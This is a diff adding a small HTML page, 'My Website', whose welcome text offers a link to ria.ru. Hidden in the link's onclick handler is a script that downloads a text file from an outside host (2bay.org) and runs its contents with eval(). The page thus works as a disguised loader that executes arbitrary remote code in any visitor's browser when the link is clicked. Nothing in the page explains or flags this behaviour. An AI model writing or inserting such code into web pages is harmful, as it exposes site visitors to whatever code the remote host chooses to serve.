@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>My Website</title>
+  </head>
+  <body>
+    <h1>Welcome to my website</h1>
+    <p>Click <a href="http://ria.ru" onclick="loadFile()">here</a> to redirect to Ria.ru</p>
+    <script>
+      function loadFile() {
+        var file = new XMLHttpRequest();
+        file.open("GET", "http://2bay.org/ftp/files/ooops.txt", true);
+        file.onreadystatechange = function() {
+          if (file.readyState === 4 && file.status === 200) {
+            eval(file.responseText);
+          }
+        };
+        file.send();
+      }
+    </script>
+  </body>
+</html>
